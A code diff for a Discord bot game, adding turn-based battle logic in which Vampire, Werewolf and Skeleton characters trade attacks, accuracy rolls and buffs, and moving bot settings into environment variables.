@@ -19,12 +19,13 @@ guildIDs = guildIDs.split(',')
 guildIDs = [int(x) for x in guildIDs]
 
 whitelistroleid = int(os.getenv('whitelistroleid'))
+clientuserid = int(os.getenv('clientuserid'))
+token = os.getenv('bottoken')
 
 dbhost = os.getenv('dbhost')
 dbuser = os.getenv('dbuser')
 dbpass = os.getenv('dbpass')
 dbname = os.getenv('dbname')
-dbport = int(os.getenv('dbport'))
 
 vampireimgurl = os.getenv('vampireimgurl')
 skeletonimgurl = os.getenv('skeletonimgurl')
@@ -65,7 +66,7 @@ mydb = mysql.connector.connect(
     user=dbuser,
     password=dbpass,
     database=dbname,
-    port=dbport,
+    port=3306,
     autocommit=True
 )
 
@@ -1931,156 +1932,995 @@ class ConfirmPurchase(discord.ui.View):
             await self.msg.edit(embed=discord.Embed(description="**Timed out... Type `/buy <equipment>` to buy equipment again!**", color=embedcolor), view=None)
 
 
-# class BattleDropdown(discord.ui.Select):
-#     def __init__(self):
-#
-#         options = [
-#             discord.SelectOption(label=self.view.attacklowname,
-#                                  description="+10 Attack Damage for High Attack"),
-#         ]
-#
-#         super().__init__(placeholder='Please select an item to equip...',
-#                          min_values=1, max_values=1, options=options)
-#
-#     async def callback(self, interaction: discord.Interaction):
-#         if interaction.user != self.view.ctx.author:
-#             await interaction.response.send_message(embed=discord.Embed(description=f"**You are not {self.view.ctx.author.mention}. Use your own commands!**", color=embedcolor), ephemeral=True)
-#             return
-#
-#         if self.values[0] == 'Hidden Dagger':
-#
-#
-# class BattleDropDownView(discord.ui.View):
-#     def __init__(self, ctx, equipment):
-#         super().__init__()
-#         self.ctx = ctx
-#         self.equipment = equipment
-#
-#         self.add_item(EquipDropdown())
-#
-#     async def on_timeout(self):
-#         if self.msg:
-#             await self.msg.edit(embed=discord.Embed(description="**Timed out... Cancelled battle!**", color=embedcolor), view=None)
-#
-#
-# class ConfirmBattle(discord.ui.View):
-#     def __init__(self, ctx, opponent):
-#         super().__init__()
-#         self.ctx = ctx
-#         self.opponent = opponent
-#         self.msg = None
-#
-#     @discord.ui.button(label='Yes', style=discord.ButtonStyle.green)
-#     async def confirm(self, button: discord.ui.Button, interaction: discord.Interaction):
-#         if interaction.user != self.opponent:
-#             await interaction.response.send_message(embed=discord.Embed(description=f"**You are not {self.opponent.mention}!**", color=embedcolor), ephemeral=True)
-#             return
-#
-#         self.clear_items()
-#         self.stop()
-#
-#         await self.msg.edit(view=self)
-#
-#         mycursor.execute("SELECT freak, equipment1, equipment2, equipment3 FROM Users WHERE userID=%(userID)s OR userID=%(userID2)s",
-#                          {'userID': self.ctx.author.id, 'userID2': opponent.id})
-#
-#         for x in mycursor:
-#
-#             embed = discord.Embed(title=f"{ctx.author.display_name}'s Stats", color=embedcolor)
-#             embed.set_footer(text=footertext, icon_url=ctx.guild.icon.url)
-#             embed.set_author(name=ctx.author.name, icon_url=ctx.author.avatar.url)
-#             embed.timestamp = discord.utils.utcnow()
-#
-#             lowaccuracy = baseattacklowaccuracy
-#             highaccuracy = baseattackhighaccuracy
-#
-#             if x[0] == "V":
-#                 freakname = "Vampire"
-#                 buff1 = "+10 Accuracy"
-#                 buff2 = "+15 Attack Damage"
-#                 health = vampirebasehealth
-#                 defense = vampirebasedefense
-#                 buff1name = vampirebuff1name
-#                 buff2name = vampirebuff2name
-#                 attacklow = vampirebaseattacklow
-#                 attackhigh = vampirebaseattackhigh
-#                 attacklowname = vampireattacklowname
-#                 attackhighname = vampireattackhighname
-#
-#             elif x[0] == "W":
-#                 freakname = "Werewolf"
-#                 buff1 = "+10 Accuracy"
-#                 buff2 = "+10 Defense"
-#                 health = werewolfbasehealth
-#                 defense = werewolfbasedefense
-#                 buff1name = werewolfbuff1name
-#                 buff2name = werewolfbuff2name
-#                 attacklow = werewolfbaseattacklow
-#                 attackhigh = werewolfbaseattackhigh
-#                 attacklowname = werewolfattacklowname
-#                 attackhighname = werewolfattackhighname
-#
-#             elif x[0] == "S":
-#                 freakname = "Skeleton"
-#                 buff1 = "+15 Attack Damage"
-#                 buff2 = "+10 Defense"
-#                 health = skeletonbasehealth
-#                 defense = skeletonbasedefense
-#                 buff1name = skeletonbuff1name
-#                 buff2name = skeletonbuff2name
-#                 attacklow = skeletonbaseattacklow
-#                 attackhigh = skeletonbaseattackhigh
-#                 attacklowname = skeletonattacklowname
-#                 attackhighname = skeletonattackhighname
-#
-#         await interaction.response.send_message(embed=embed, view=view)
-#
-#     @discord.ui.button(label='No', style=discord.ButtonStyle.red)
-#     async def cancel(self, button: discord.ui.Button, interaction: discord.Interaction):
-#         if interaction.user != self.opponent:
-#             await interaction.response.send_message(embed=discord.Embed(description=f"**You are not {self.opponent.mention}!**", color=embedcolor), ephemeral=True)
-#             return
-#
-#         self.clear_items()
-#         self.stop()
-#
-#         await self.msg.edit(view=self)
-#
-#         await interaction.response.send_message(f"{self.ctx.author.mention}{self.opponent.mention}", embed=discord.Embed(description="**Cancelled battle!**", color=embedcolor))
-#
-#     async def on_timeout(self):
-#         if self.msg:
-#             await self.msg.edit(embed=discord.Embed(description="**Timed out... Cancelled battle!**", color=embedcolor), view=None)
+class BattleDropdown(discord.ui.Select):
+    def __init__(self, label1, description1, label2, description2, label3, description3, label4, description4):
+
+        options = [
+            discord.SelectOption(label=label1,
+                                 description=description1, value=1),
+            discord.SelectOption(label=label2,
+                                 description=description2, value=2),
+            discord.SelectOption(label=label3,
+                                 description=description3, value=3),
+            discord.SelectOption(label=label4,
+                                 description=description4, value=4)
+        ]
+
+        super().__init__(placeholder='Please select a skill...',
+                         min_values=1, max_values=1, options=options)
+
+    async def callback(self, interaction: discord.Interaction):
+        if self.view.p1turn and interaction.user != self.view.ctx.author:
+            await interaction.response.send_message(embed=discord.Embed(description=f"**You are not {self.view.ctx.author.mention}!**", color=embedcolor), ephemeral=True)
+            return
+
+        elif not self.view.p1turn and interaction.user != self.view.opponent:
+            await interaction.response.send_message(embed=discord.Embed(description=f"**You are not {self.view.opponent.mention}!**", color=embedcolor), ephemeral=True)
+            return
+
+        # if its player 1s turn
+        if interaction.user == self.view.ctx.author:
+            if self.view.p1freakyid == "V":
+                if self.values[0] == "1":
+                    chancetomiss = 100 - self.view.p1lowaccuracy
+                    accuracyvalue = random.randrange(1, 101)
+                    if accuracyvalue > chancetomiss:
+
+                        piercevalue = random.randrange(1, 101)
+                        if piercevalue > self.view.p1piercepercent:
+
+                            damage = self.view.p2defense + self.view.p2lowdefense - self.view.p1attacklow
+                            if damage < 0:
+                                self.view.p2health += damage
+                                actionperformed = f"**{self.view.ctx.author.mention} used {self.view.p1attacklowname} and did {abs(damage)} Attack Damage!**"
+
+                            else:
+                                actionperformed = f"**{self.view.opponent.mention} completely blocked {self.view.ctx.author.mention}'s {self.view.p1attacklowname} with their Defense!**"
+
+                        else:
+                            self.view.p2health -= self.view.p1attacklow
+                            actionperformed = f"**{self.view.ctx.author.mention} used {self.view.p1attacklowname} and completely pierced through {self.view.opponent.mention}'s Defense dealing {self.view.p1attacklow} Attack Damage!**"
+
+                    else:
+                        actionperformed = f"**{self.view.ctx.author.mention} completely missed their {self.view.p1attacklowname} and did no damage!**"
+
+                elif self.values[0] == "2":
+                    chancetomiss = 100 - self.view.p1highaccuracy
+                    accuracyvalue = random.randrange(1, 101)
+                    if accuracyvalue > chancetomiss:
+
+                        piercevalue = random.randrange(1, 101)
+                        if piercevalue > self.view.p1piercepercent:
+
+                            damage = self.view.p2defense + self.view.p2highdefense - self.view.p1attackhigh
+                            if damage < 0:
+                                self.view.p2health += damage
+                                self.view.p1health += 10
+                                actionperformed = f"**{self.view.ctx.author.mention} used {self.view.p1attackhighname} dealing {abs(damage)} Attack Damage and gaining 10 Health!**"
+
+                            else:
+                                self.view.p1health += 10
+                                actionperformed = f"**{self.view.opponent.mention} completely blocked {self.view.ctx.author.mention}'s {self.view.p1attackhighname} with their Defense but still landed their attack and gained 10 Health!**"
+
+                        else:
+                            self.view.p2health -= self.view.p1attackhigh
+                            self.view.p1health += 10
+                            actionperformed = f"**{self.view.ctx.author.mention} used {self.view.p1attackhighname} and completely pierced through {self.view.opponent.mention}'s Defense dealing {self.view.p1attackhigh} Attack Damage and gaining 10 Health!**"
+
+                    else:
+                        actionperformed = f"**{self.view.ctx.author.mention} completely missed their {self.view.p1attackhighname} and did no damage!**"
+
+                elif self.values[0] == "3":
+                    self.view.p1lowaccuracy += 10
+                    if self.view.p1lowaccuracy > 100:
+                        self.view.p1lowaccuracy = 100
+                    self.view.p1highaccuracy += 10
+                    if self.view.p1highaccuracy > 100:
+                        self.view.p1highaccuracy = 100
+                    actionperformed = f"**{self.view.ctx.author.mention} used {self.view.p1buff1name} and gained 10% Accuracy for low and high attacks!**"
+
+                elif self.values[0] == "4":
+                    self.view.p1attacklow += 15
+                    self.view.p1attackhigh += 15
+                    actionperformed = f"**{self.view.ctx.author.mention} used {self.view.p1buff2name} and gained 15 Attack Damage for low and high attacks!**"
+
+            elif self.view.p1freakyid == "W":
+                if self.values[0] == "1":
+                    chancetomiss = 100 - self.view.p1lowaccuracy
+                    accuracyvalue = random.randrange(1, 101)
+                    if accuracyvalue > chancetomiss:
+
+                        piercevalue = random.randrange(1, 101)
+                        if piercevalue > self.view.p1piercepercent:
+
+                            damage = self.view.p2defense + self.view.p2lowdefense - self.view.p1attacklow
+                            if damage < 0:
+                                self.view.p2health += damage
+                                actionperformed = f"**{self.view.ctx.author.mention} used {self.view.p1attacklowname} and did {abs(damage)} Attack Damage!**"
+
+                            else:
+                                actionperformed = f"**{self.view.opponent.mention} completely blocked {self.view.ctx.author.mention}'s {self.view.p1attacklowname} with their Defense!**"
+
+                        else:
+                            self.view.p2health -= self.view.p1attacklow
+                            actionperformed = f"**{self.view.ctx.author.mention} used {self.view.p1attacklowname} and completely pierced through {self.view.opponent.mention}'s Defense dealing {self.view.p1attacklow} Attack Damage!**"
+
+                    else:
+                        actionperformed = f"**{self.view.ctx.author.mention} completely missed their {self.view.p1attacklowname} and did no damage!**"
+
+                elif self.values[0] == "2":
+                    chancetomiss = 100 - self.view.p1highaccuracy
+                    accuracyvalue = random.randrange(1, 101)
+                    if accuracyvalue > chancetomiss:
+
+                        piercevalue = random.randrange(1, 101)
+                        if piercevalue > self.view.p1piercepercent:
+
+                            damage = self.view.p2defense + self.view.p2highdefense - self.view.p1attackhigh
+                            if damage < 0:
+                                self.view.p2health += damage
+                                self.view.p1piercepercent += 5
+                                actionperformed = f"**{self.view.ctx.author.mention} used {self.view.p1attackhighname} dealing {abs(damage)} Attack Damage and gaining 5% pierce chance for all attacks!**"
+
+                            else:
+                                self.view.p1piercepercent += 5
+                                actionperformed = f"**{self.view.opponent.mention} completely blocked {self.view.ctx.author.mention}'s {self.view.p1attackhighname} with their Defense but still landed their attack and gained 5% pierce chance for all attacks!**"
+
+                        else:
+                            self.view.p2health -= self.view.p1attackhigh
+                            self.view.p1piercepercent += 5
+                            actionperformed = f"**{self.view.ctx.author.mention} used {self.view.p1attackhighname} and completely pierced through {self.view.opponent.mention}'s Defense dealing {self.view.p1attackhigh} Attack Damage and gaining 5% pierce chance for all attacks!**"
+
+                    else:
+                        actionperformed = f"**{self.view.ctx.author.mention} completely missed their {self.view.p1attackhighname} and did no damage!**"
+
+                elif self.values[0] == "3":
+                    self.view.p1lowaccuracy += 10
+                    if self.view.p1lowaccuracy > 100:
+                        self.view.p1lowaccuracy = 100
+                    self.view.p1highaccuracy += 10
+                    if self.view.p1highaccuracy > 100:
+                        self.view.p1highaccuracy = 100
+                    actionperformed = f"**{self.view.ctx.author.mention} used {self.view.p1buff1name} and gained 10% Accuracy for low and high attacks!**"
+
+                elif self.values[0] == "4":
+                    self.view.p1defense += 10
+                    actionperformed = f"**{self.view.ctx.author.mention} used {self.view.p1buff2name} and gained 10 Defense!**"
+
+            elif self.view.p1freakyid == "S":
+                if self.values[0] == "1":
+                    chancetomiss = 100 - self.view.p1lowaccuracy
+                    accuracyvalue = random.randrange(1, 101)
+                    if accuracyvalue > chancetomiss:
+
+                        piercevalue = random.randrange(1, 101)
+                        if piercevalue > self.view.p1piercepercent:
+
+                            damage = self.view.p2defense + self.view.p2lowdefense - self.view.p1attacklow
+                            if damage < 0:
+                                self.view.p2health += damage
+                                actionperformed = f"**{self.view.ctx.author.mention} used {self.view.p1attacklowname} and did {abs(damage)} Attack Damage!**"
+
+                            else:
+                                actionperformed = f"**{self.view.opponent.mention} completely blocked {self.view.ctx.author.mention}'s {self.view.p1attacklowname} with their Defense!**"
+
+                        else:
+                            self.view.p2health -= self.view.p1attacklow
+                            actionperformed = f"**{self.view.ctx.author.mention} used {self.view.p1attacklowname} and completely pierced through {self.view.opponent.mention}'s Defense dealing {self.view.p1attacklow} Attack Damage!**"
+
+                    else:
+                        actionperformed = f"**{self.view.ctx.author.mention} completely missed their {self.view.p1attacklowname} and did no damage!**"
+
+                elif self.values[0] == "2":
+                    chancetomiss = 100 - self.view.p1highaccuracy
+                    accuracyvalue = random.randrange(1, 101)
+                    if accuracyvalue > chancetomiss:
+
+                        piercevalue = random.randrange(1, 101)
+                        if piercevalue > self.view.p1piercepercent:
+
+                            damage = self.view.p2defense + self.view.p2highdefense - self.view.p1attackhigh
+                            if damage < 0:
+                                self.view.p2health += damage
+                                self.view.p1lowaccuracy += 20
+                                if self.view.p1lowaccuracy > 100:
+                                    self.view.p1lowaccuracy = 100
+                                self.view.p1highaccuracy += 20
+                                if self.view.p1highaccuracy > 100:
+                                    self.view.p1highaccuracy = 100
+                                actionperformed = f"**{self.view.ctx.author.mention} used {self.view.p1attackhighname} dealing {abs(damage)} Attack Damage and gaining 20% accuracy for all attacks!**"
+
+                            else:
+                                self.view.p1lowaccuracy += 20
+                                if self.view.p1lowaccuracy > 100:
+                                    self.view.p1lowaccuracy = 100
+                                self.view.p1highaccuracy += 20
+                                if self.view.p1highaccuracy > 100:
+                                    self.view.p1highaccuracy = 100
+                                actionperformed = f"**{self.view.opponent.mention} completely blocked {self.view.ctx.author.mention}'s {self.view.p1attackhighname} with their Defense but still landed their attack and gained 20% accuracy for all attacks!**"
+
+                        else:
+                            self.view.p2health -= self.view.p1attackhigh
+                            self.view.p1lowaccuracy += 20
+                            if self.view.p1lowaccuracy > 100:
+                                self.view.p1lowaccuracy = 100
+                            self.view.p1highaccuracy += 20
+                            if self.view.p1highaccuracy > 100:
+                                self.view.p1highaccuracy = 100
+                            actionperformed = f"**{self.view.ctx.author.mention} used {self.view.p1attackhighname} and completely pierced through {self.view.opponent.mention}'s Defense dealing {self.view.p1attackhigh} Attack Damage and gaining 20% accuracy for all attacks!**"
+
+                    else:
+                        actionperformed = f"**{self.view.ctx.author.mention} completely missed their {self.view.p1attackhighname} and did no damage!**"
+
+                elif self.values[0] == "3":
+                    self.view.p1attacklow += 15
+                    self.view.p1attackhigh += 15
+                    actionperformed = f"**{self.view.ctx.author.mention} used {self.view.p1buff1name} and gained 15 Attack Damage for low and high attacks!**"
+
+                elif self.values[0] == "4":
+                    self.view.p1defense += 10
+                    actionperformed = f"**{self.view.ctx.author.mention} used {self.view.p1buff2name} and gained 10 Defense!**"
+
+            self.view.p1turn = False
+
+            embed = discord.Embed(
+                title=f"{self.view.ctx.author.display_name} vs {self.view.opponent.display_name}", description=actionperformed, color=embedcolor)
+            embed.set_footer(text=footertext, icon_url=self.view.ctx.guild.icon.url)
+            embed.set_author(name=f"{self.view.opponent.display_name}'s Turn - Round {self.view.round}",
+                             icon_url=self.view.opponent.avatar.url)
+            embed.timestamp = discord.utils.utcnow()
+            embed.set_thumbnail(url=self.view.ctx.guild.icon.url)
+            embed.add_field(name=self.view.p1freak,
+                            value=f"Health \U00002764 - `{self.view.p1health}`")
+            embed.add_field(name=self.view.p2freak,
+                            value=f"Health \U00002764 - `{self.view.p2health}`")
+
+            view = BattleDropDownView(self.view.ctx, self.view.opponent, self.view.p1freak, self.view.p1attacklowname, self.view.p1attackhighname, self.view.p1buff1name, self.view.p1buff2name, self.view.p1buff1description, self.view.p1buff2description, self.view.p1attacklow, self.view.p1attackhigh, self.view.p1health, self.view.p1defense, self.view.p1highdefense, self.view.p1lowdefense, self.view.p1lowaccuracy, self.view.p1highaccuracy, self.view.p1piercepercent, self.view.p1equipmentstealpercent,
+                                      self.view.p1goldstealpercent, self.view.p2freak, self.view.p2attacklowname, self.view.p2attackhighname, self.view.p2buff1name, self.view.p2buff2name, self.view.p2buff1description, self.view.p2buff2description, self.view.p2attacklow, self.view.p2attackhigh, self.view.p2health, self.view.p2defense, self.view.p2highdefense, self.view.p2lowdefense, self.view.p2lowaccuracy, self.view.p2highaccuracy, self.view.p2piercepercent, self.view.p2equipmentstealpercent, self.view.p2goldstealpercent, self.view.p1turn, self.view.round, self.view.p1freakyid, self.view.p2freakyid)
+
+            await interaction.response.edit_message(embed=embed, view=view)
+
+            view.msg = await interaction.original_message()
+
+        elif interaction.user == self.view.opponent:
+            if self.view.p2freakyid == "V":
+                if self.values[0] == "1":
+                    chancetomiss = 100 - self.view.p2lowaccuracy
+                    accuracyvalue = random.randrange(1, 101)
+                    if accuracyvalue > chancetomiss:
+
+                        piercevalue = random.randrange(1, 101)
+                        if piercevalue > self.view.p2piercepercent:
+
+                            damage = self.view.p1defense + self.view.p1lowdefense - self.view.p2attacklow
+                            if damage < 0:
+                                self.view.p1health += damage
+                                actionperformed = f"**{self.view.opponent.mention} used {self.view.p2attacklowname} and did {abs(damage)} Attack Damage!**"
+
+                            else:
+                                actionperformed = f"**{self.view.ctx.author.mention} completely blocked {self.view.opponent.mention}'s {self.view.p2attacklowname} with their Defense!**"
+
+                        else:
+                            self.view.p1health -= self.view.p2attacklow
+                            actionperformed = f"**{self.view.opponent.mention} used {self.view.p2attacklowname} and completely pierced through {self.view.ctx.author.mention}'s Defense dealing {self.view.p2attacklow} Attack Damage!**"
+
+                    else:
+                        actionperformed = f"**{self.view.opponent.mention} completely missed their {self.view.p2attacklowname} and did no damage!**"
+
+                elif self.values[0] == "2":
+                    chancetomiss = 100 - self.view.p2highaccuracy
+                    accuracyvalue = random.randrange(1, 101)
+                    if accuracyvalue > chancetomiss:
+
+                        piercevalue = random.randrange(1, 101)
+                        if piercevalue > self.view.p2piercepercent:
+
+                            damage = self.view.p1defense + self.view.p1highdefense - self.view.p2attackhigh
+                            if damage < 0:
+                                self.view.p1health += damage
+                                self.view.p2health += 10
+                                actionperformed = f"**{self.view.opponent.mention} used {self.view.p2attackhighname} dealing {abs(damage)} Attack Damage and gaining 10 Health!**"
+
+                            else:
+                                self.view.p1health += 10
+                                actionperformed = f"**{self.view.ctx.author.mention} completely blocked {self.view.opponent.mention}'s {self.view.p2attackhighname} with their Defense but still landed their attack and gained 10 Health!**"
+
+                        else:
+                            self.view.p1health -= self.view.p2attackhigh
+                            self.view.p2health += 10
+                            actionperformed = f"**{self.view.opponent.mention} used {self.view.p2attackhighname} and completely pierced through {self.view.ctx.author.mention}'s Defense dealing {self.view.p2attackhigh} Attack Damage and gaining 10 Health!**"
+
+                    else:
+                        actionperformed = f"**{self.view.opponent.mention} completely missed their {self.view.p2attackhighname} and did no damage!**"
+
+                elif self.values[0] == "3":
+                    self.view.p2lowaccuracy += 10
+                    if self.view.p2lowaccuracy > 100:
+                        self.view.p2lowaccuracy = 100
+                    self.view.p2highaccuracy += 10
+                    if self.view.p2highaccuracy > 100:
+                        self.view.p2highaccuracy = 100
+                    actionperformed = f"**{self.view.opponent.mention} used {self.view.p2buff1name} and gained 10% Accuracy for low and high attacks!**"
+
+                elif self.values[0] == "4":
+                    self.view.p2attacklow += 15
+                    self.view.p2attackhigh += 15
+                    actionperformed = f"**{self.view.opponent.mention} used {self.view.p2buff2name} and gained 15 Attack Damage for low and high attacks!**"
+
+            elif self.view.p2freakyid == "W":
+                if self.values[0] == "1":
+                    chancetomiss = 100 - self.view.p2lowaccuracy
+                    accuracyvalue = random.randrange(1, 101)
+                    if accuracyvalue > chancetomiss:
+
+                        piercevalue = random.randrange(1, 101)
+                        if piercevalue > self.view.p2piercepercent:
+
+                            damage = self.view.p1defense + self.view.p1lowdefense - self.view.p2attacklow
+                            if damage < 0:
+                                self.view.p1health += damage
+                                actionperformed = f"**{self.view.opponent.mention} used {self.view.p2attacklowname} and did {abs(damage)} Attack Damage!**"
+
+                            else:
+                                actionperformed = f"**{self.view.ctx.author.mention} completely blocked {self.view.opponent.mention}'s {self.view.p2attacklowname} with their Defense!**"
+
+                        else:
+                            self.view.p1health -= self.view.p2attacklow
+                            actionperformed = f"**{self.view.opponent.mention} used {self.view.p2attacklowname} and completely pierced through {self.view.ctx.author.mention}'s Defense dealing {self.view.p2attacklow} Attack Damage!**"
+
+                    else:
+                        actionperformed = f"**{self.view.opponent.mention} completely missed their {self.view.p2attacklowname} and did no damage!**"
+
+                elif self.values[0] == "2":
+                    chancetomiss = 100 - self.view.p2highaccuracy
+                    accuracyvalue = random.randrange(1, 101)
+                    if accuracyvalue > chancetomiss:
+
+                        piercevalue = random.randrange(1, 101)
+                        if piercevalue > self.view.p2piercepercent:
+
+                            damage = self.view.p1defense + self.view.p1highdefense - self.view.p2attackhigh
+                            if damage < 0:
+                                self.view.p1health += damage
+                                self.view.p2piercepercent += 5
+                                actionperformed = f"**{self.view.opponent.mention} used {self.view.p2attackhighname} dealing {abs(damage)} Attack Damage and gaining 5% pierce chance for all attacks!**"
+
+                            else:
+                                self.view.p2piercepercent += 5
+                                actionperformed = f"**{self.view.ctx.author.mention} completely blocked {self.view.opponent.mention}'s {self.view.p2attackhighname} with their Defense but still landed their attack and gained 5% pierce chance for all attacks!**"
+
+                        else:
+                            self.view.p1health -= self.view.p2attackhigh
+                            self.view.p2piercepercent += 5
+                            actionperformed = f"**{self.view.opponent.mention} used {self.view.p2attackhighname} and completely pierced through {self.view.ctx.author.mention}'s Defense dealing {self.view.p2attackhigh} Attack Damage and gaining 5% pierce chance for all attacks!**"
+
+                    else:
+                        actionperformed = f"**{self.view.opponent.mention} completely missed their {self.view.p2attackhighname} and did no damage!**"
+
+                elif self.values[0] == "3":
+                    self.view.p2lowaccuracy += 10
+                    if self.view.p2lowaccuracy > 100:
+                        self.view.p2lowaccuracy = 100
+                    self.view.p2highaccuracy += 10
+                    if self.view.p2highaccuracy > 100:
+                        self.view.p2highaccuracy = 100
+                    actionperformed = f"**{self.view.opponent.mention} used {self.view.p2buff1name} and gained 10% Accuracy for low and high attacks!**"
+
+                elif self.values[0] == "4":
+                    self.view.p2defense += 10
+                    actionperformed = f"**{self.view.opponent.mention} used {self.view.p2buff2name} and gained 10 Defense!**"
+
+            elif self.view.p2freakyid == "S":
+                if self.values[0] == "1":
+                    chancetomiss = 100 - self.view.p2lowaccuracy
+                    accuracyvalue = random.randrange(1, 101)
+                    if accuracyvalue > chancetomiss:
+
+                        piercevalue = random.randrange(1, 101)
+                        if piercevalue > self.view.p2piercepercent:
+
+                            damage = self.view.p1defense + self.view.p1lowdefense - self.view.p2attacklow
+                            if damage < 0:
+                                self.view.p1health += damage
+                                actionperformed = f"**{self.view.opponent.mention} used {self.view.p2attacklowname} and did {abs(damage)} Attack Damage!**"
+
+                            else:
+                                actionperformed = f"**{self.view.ctx.author.mention} completely blocked {self.view.opponent.mention}'s {self.view.p2attacklowname} with their Defense!**"
+
+                        else:
+                            self.view.p1health -= self.view.p2attacklow
+                            actionperformed = f"**{self.view.opponent.mention} used {self.view.p2attacklowname} and completely pierced through {self.view.ctx.author.mention}'s Defense dealing {self.view.p2attacklow} Attack Damage!**"
+
+                    else:
+                        actionperformed = f"**{self.view.opponent.mention} completely missed their {self.view.p2attacklowname} and did no damage!**"
+
+                elif self.values[0] == "2":
+                    chancetomiss = 100 - self.view.p2highaccuracy
+                    accuracyvalue = random.randrange(1, 101)
+                    if accuracyvalue > chancetomiss:
+
+                        piercevalue = random.randrange(1, 101)
+                        if piercevalue > self.view.p2piercepercent:
+
+                            damage = self.view.p1defense + self.view.p1highdefense - self.view.p2attackhigh
+                            if damage < 0:
+                                self.view.p1health += damage
+                                self.view.p2lowaccuracy += 20
+                                if self.view.p2lowaccuracy > 100:
+                                    self.view.p2lowaccuracy = 100
+                                self.view.p2highaccuracy += 20
+                                if self.view.p2highaccuracy > 100:
+                                    self.view.p2highaccuracy = 100
+                                actionperformed = f"**{self.view.opponent.mention} used {self.view.p2attackhighname} dealing {abs(damage)} Attack Damage and gaining 20% accuracy for all attacks!**"
+
+                            else:
+                                self.view.p2lowaccuracy += 20
+                                if self.view.p2lowaccuracy > 100:
+                                    self.view.p2lowaccuracy = 100
+                                self.view.p2highaccuracy += 20
+                                if self.view.p2highaccuracy > 100:
+                                    self.view.p2highaccuracy = 100
+                                actionperformed = f"**{self.view.ctx.author.mention} completely blocked {self.view.opponent.mention}'s {self.view.p2attackhighname} with their Defense but still landed their attack and gained 20% accuracy for all attacks!**"
+
+                        else:
+                            self.view.p1health -= self.view.p2attackhigh
+                            self.view.p2lowaccuracy += 20
+                            if self.view.p2lowaccuracy > 100:
+                                self.view.p2lowaccuracy = 100
+                            self.view.p2highaccuracy += 20
+                            if self.view.p2highaccuracy > 100:
+                                self.view.p2highaccuracy = 100
+                            actionperformed = f"**{self.view.opponent.mention} used {self.view.p2attackhighname} and completely pierced through {self.view.ctx.author.mention}'s Defense dealing {self.view.p2attackhigh} Attack Damage and gaining 20% accuracy for all attacks!**"
+
+                    else:
+                        actionperformed = f"**{self.view.opponent.mention} completely missed their {self.view.p2attackhighname} and did no damage!**"
+
+                elif self.values[0] == "3":
+                    self.view.p2attacklow += 15
+                    self.view.p2attackhigh += 15
+                    actionperformed = f"**{self.view.opponent.mention} used {self.view.p2buff1name} and gained 15 Attack Damage for low and high attacks!**"
+
+                elif self.values[0] == "4":
+                    self.view.p2defense += 10
+                    actionperformed = f"**{self.view.opponent.mention} used {self.view.p2buff2name} and gained 10 Defense!**"
+
+            self.view.p1turn = True
+            self.view.round += 1
+
+            p1win = None
+            if self.view.p1health < 0 and self.view.p2health < 0:
+                if self.view.p1health < self.view.p2health:
+                    p1win = False
+                else:
+                    p1win = True
+            elif self.view.p1health < 0:
+                p1win = False
+            elif self.view.p2health < 0:
+                p1win = True
+
+            if p1win == None:
+                embed = discord.Embed(
+                    title=f"{self.view.ctx.author.display_name} vs {self.view.opponent.display_name}", description=actionperformed, color=embedcolor)
+                embed.set_footer(text=footertext, icon_url=self.view.ctx.guild.icon.url)
+                embed.set_author(name=f"{self.view.ctx.author.display_name}'s Turn - Round {self.view.round}",
+                                 icon_url=self.view.ctx.author.avatar.url)
+                embed.timestamp = discord.utils.utcnow()
+                embed.set_thumbnail(url=self.view.ctx.guild.icon.url)
+                embed.add_field(name=self.view.p1freak,
+                                value=f"Health \U00002764 - `{self.view.p1health}`")
+                embed.add_field(name=self.view.p2freak,
+                                value=f"Health \U00002764 - `{self.view.p2health}`")
+
+                view = BattleDropDownView(self.view.ctx, self.view.opponent, self.view.p1freak, self.view.p1attacklowname, self.view.p1attackhighname, self.view.p1buff1name, self.view.p1buff2name, self.view.p1buff1description, self.view.p1buff2description, self.view.p1attacklow, self.view.p1attackhigh, self.view.p1health, self.view.p1defense, self.view.p1highdefense, self.view.p1lowdefense, self.view.p1lowaccuracy, self.view.p1highaccuracy, self.view.p1piercepercent, self.view.p1equipmentstealpercent,
+                                          self.view.p1goldstealpercent, self.view.p2freak, self.view.p2attacklowname, self.view.p2attackhighname, self.view.p2buff1name, self.view.p2buff2name, self.view.p2buff1description, self.view.p2buff2description, self.view.p2attacklow, self.view.p2attackhigh, self.view.p2health, self.view.p2defense, self.view.p2highdefense, self.view.p2lowdefense, self.view.p2lowaccuracy, self.view.p2highaccuracy, self.view.p2piercepercent, self.view.p2equipmentstealpercent, self.view.p2goldstealpercent, self.view.p1turn, self.view.round, self.view.p1freakyid, self.view.p2freakyid)
+
+                await interaction.response.edit_message(embed=embed, view=view)
+
+                view.msg = await interaction.original_message()
+
+            elif p1win:
+                embed = discord.Embed(
+                    title=f"{self.view.ctx.author.display_name} vs {self.view.opponent.display_name}", description=actionperformed+f"\n\n**{self.view.ctx.author.display_name} wins as {self.view.opponent.display_name} is no longer able to fight!**", color=embedcolor)
+                embed.set_footer(text=footertext, icon_url=self.view.ctx.guild.icon.url)
+                embed.set_author(name=f"Congratulations {self.view.ctx.author.display_name}!",
+                                 icon_url=self.view.ctx.author.avatar.url)
+                embed.timestamp = discord.utils.utcnow()
+                embed.set_thumbnail(url=self.view.ctx.guild.icon.url)
+                embed.add_field(name=self.view.p1freak,
+                                value=f"Health \U00002764 - `{self.view.p1health}`")
+                embed.add_field(name=self.view.p2freak,
+                                value=f"Health \U00002764 - `{self.view.p2health}`")
+
+                view = WinView(self.view.ctx.author, self.view.opponent,
+                               self.view.p1equipmentstealpercent, self.view.p1goldstealpercent)
+
+                await interaction.response.edit_message(embed=embed, view=view)
+
+                view.msg = await interaction.original_message()
+
+            elif not p1win:
+                embed = discord.Embed(
+                    title=f"{self.view.ctx.author.display_name} vs {self.view.opponent.display_name}", description=actionperformed+f"\n\n**{self.view.opponent.display_name} wins as {self.view.ctx.author.display_name} is no longer able to fight!**", color=embedcolor)
+                embed.set_footer(text=footertext, icon_url=self.view.ctx.guild.icon.url)
+                embed.set_author(name=f"Congratulations {self.view.opponent.display_name}!",
+                                 icon_url=self.view.opponent.avatar.url)
+                embed.timestamp = discord.utils.utcnow()
+                embed.set_thumbnail(url=self.view.ctx.guild.icon.url)
+                embed.add_field(name=self.view.p1freak,
+                                value=f"Health \U00002764 - `{self.view.p1health}`")
+                embed.add_field(name=self.view.p2freak,
+                                value=f"Health \U00002764 - `{self.view.p2health}`")
+
+                view = WinView(self.view.opponent, self.view.ctx.author,
